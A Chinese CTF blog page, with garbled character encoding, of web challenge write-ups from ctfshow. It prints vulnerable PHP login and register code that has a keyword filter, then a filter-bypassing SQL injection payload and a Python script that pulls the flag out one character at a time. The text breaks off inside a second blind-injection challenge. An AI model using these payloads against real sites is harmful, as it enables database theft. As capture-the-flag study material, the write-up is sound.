<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>webğŸ•æ¯æ—¥ä¸€é¢˜ | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æ¯æ—¥ä¸€é¢˜ æ¯å¤©ä¸€é¢˜ç½¢äº†ã€‚ã€‚  ctfshowå†…éƒ¨èµ›ç­¾åˆ°æ‰«åˆ°å¤‡ä»½æ–‡ä»¶ login.php 123456789101112131415161718192021222324252627282930&lt;?phpfunction check($arr)&#123;if(preg_match(&quot;&#x2F;load|and|or|\||\&amp;|select|union|\&#x27;|&#x3D;| |\\\">
<meta property="og:type" content="article">
<meta property="og:title" content="webğŸ•æ¯æ—¥ä¸€é¢˜">
<meta property="og:url" content="https://xyaxxya.github.io/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/index.html">
<meta property="og:site_name" content="Yiyi">
<meta property="og:description" content="æ¯æ—¥ä¸€é¢˜ æ¯å¤©ä¸€é¢˜ç½¢äº†ã€‚ã€‚  ctfshowå†…éƒ¨èµ›ç­¾åˆ°æ‰«åˆ°å¤‡ä»½æ–‡ä»¶ login.php 123456789101112131415161718192021222324252627282930&lt;?phpfunction check($arr)&#123;if(preg_match(&quot;&#x2F;load|and|or|\||\&amp;|select|union|\&#x27;|&#x3D;| |\\\">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dmoe.cc/random.php?1827">
<meta property="article:published_time" content="2024-07-17T07:57:27.000Z">
<meta property="article:modified_time" content="2024-09-20T10:25:08.190Z">
<meta property="article:author" content="yiyi">
<meta property="article:tag" content="web">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.dmoe.cc/random.php?1827"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'webğŸ•æ¯æ—¥ä¸€é¢˜',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-20 18:25:08'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/å…³äºæˆ‘"><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?1827')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/å…³äºæˆ‘"><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">webğŸ•æ¯æ—¥ä¸€é¢˜</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2024-07-17T07:57:27.000Z" title="å‘è¡¨äº 2024-07-17 15:57:27">2024-07-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-09-20T10:25:08.190Z" title="æ›´æ–°äº 2024-09-20 18:25:08">2024-09-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">48.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>244åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" data-flag-title="webğŸ•æ¯æ—¥ä¸€é¢˜"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">è¯„è®ºæ•°:</span><a href="/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="æ¯æ—¥ä¸€é¢˜"><a href="#æ¯æ—¥ä¸€é¢˜" class="headerlink" title="æ¯æ—¥ä¸€é¢˜"></a>æ¯æ—¥ä¸€é¢˜</h1><blockquote>
<p>æ¯å¤©ä¸€é¢˜ç½¢äº†ã€‚ã€‚</p>
</blockquote>
<h2 id="ctfshowå†…éƒ¨èµ›ç­¾åˆ°"><a href="#ctfshowå†…éƒ¨èµ›ç­¾åˆ°" class="headerlink" title="ctfshowå†…éƒ¨èµ›ç­¾åˆ°"></a>ctfshowå†…éƒ¨èµ›ç­¾åˆ°</h2><p>æ‰«åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><strong>login.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/load|and|or|\||\&amp;|select|union|\&#x27;|=| |\\\|,|sleep|ascii/i&quot;</span>,<span class="variable">$arr</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">die</span>();   </span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&quot;select username from test1 where email=&#x27;<span class="subst">$e</span>&#x27; and password=&#x27;<span class="subst">$p</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$e</span>)&amp;&amp;<span class="title function_ invoke__">check</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123; </span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;u&#x27;</span>]=<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:user.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Wrong username or password&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>register.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/load|and|\||\&amp;| |\\\|sleep|ascii|if/i&quot;</span>,<span class="variable">$arr</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">die</span>();   </span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;u&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> =</span><br><span class="line"><span class="string">&quot;insert into test1 set email = &#x27;<span class="subst">$e</span>&#x27;,username = &#x27;<span class="subst">$u</span>&#x27;,password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$e</span>)&amp;&amp;<span class="title function_ invoke__">check</span>(<span class="variable">$u</span>)&amp;&amp;<span class="title function_ invoke__">check</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:login.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>user.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;bg2.jpg&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;u&#x27;</span>])&#123;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$username</span>))</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">10</span>) &#123;</span><br><span class="line">			<span class="variable">$username</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$username</span>,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Hello <span class="subst">$username</span>,there&#x27;s nothing here but dog food!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;The username can only be a number.How did you get here?go out!!!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Login first!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ³¨å†Œç•Œé¢çš„union select</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span>&quot;select username from test1 where email=&#x27;$e&#x27; and password=&#x27;$p&#x27;&quot;;</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span>&quot;insert into test1 set email = &#x27;$e&#x27;, username = &#x27;$u&#x27;,password = &#x27;$p&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>æ„é€ sqlè¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test1 <span class="keyword">set</span> email<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>,username<span class="operator">=</span>hex(hex(substr((<span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag),<span class="number">1</span>,<span class="number">1</span>))),password<span class="operator">=</span><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://7fc1279d-6a4b-4fca-968f-235322686f5b.challenge.ctf.show/register.php&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://7fc1279d-6a4b-4fca-968f-235322686f5b.challenge.ctf.show/login.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&quot;hex(hex(substr((select/**/flag/**/from/**/flag)from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))),/*&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>: <span class="built_in">str</span>(i + <span class="number">30</span>) + <span class="string">&quot;&#x27;,username=&quot;</span> + payload,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>: <span class="string">&quot;*/#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>: i + <span class="number">30</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(data1[&#x27;e&#x27;])</span></span><br><span class="line">    r1 = s.post(url1, data=data1)</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>: i + <span class="number">30</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>: i + <span class="number">30</span></span><br><span class="line">    &#125;</span><br><span class="line">    r2 = s.post(url2, data=data2)</span><br><span class="line">    t = r2.text</span><br><span class="line">    real = re.findall(<span class="string">&quot;Hello (.*?),&quot;</span>, t)[<span class="number">0</span>]</span><br><span class="line">    flag += real</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240715172712301.png" alt="image-20240715172712301"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240715172731195.png" alt="image-20240715172731195"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;88827b24-2cd9-4be6-b15d-7eb1055f9c1c&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h2><p>æ‰«åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240715192511338.png" alt="image-20240715192511338"></p>
<p>member.phpä¸­å‘ç°æ¼æ´ç‚¹</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240715192603206.png" alt="image-20240715192603206"></p>
<p>å½“æŸ¥è¯¢è¿”å›çš„ç”¨æˆ·åä¸ºç©ºä¸”å¯†ç é”™è¯¯æ—¶ï¼Œè¿›è¡Œå››æ¬¡setcookieæ“ä½œï¼Œå½“æŸ¥è¯¢è¿”å›çš„ç”¨æˆ·åä¸ºä¸ä¸ºç©ºæ—¶ï¼Œè¿›è¡Œä¸¤æ¬¡setcookieæ“ä½œåˆ©ç”¨è¿™ä¸ªå·®å¼‚ï¼Œå°±å·²ç»å¯ä»¥å®ç°å¸ƒå°”ç›²æ³¨äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 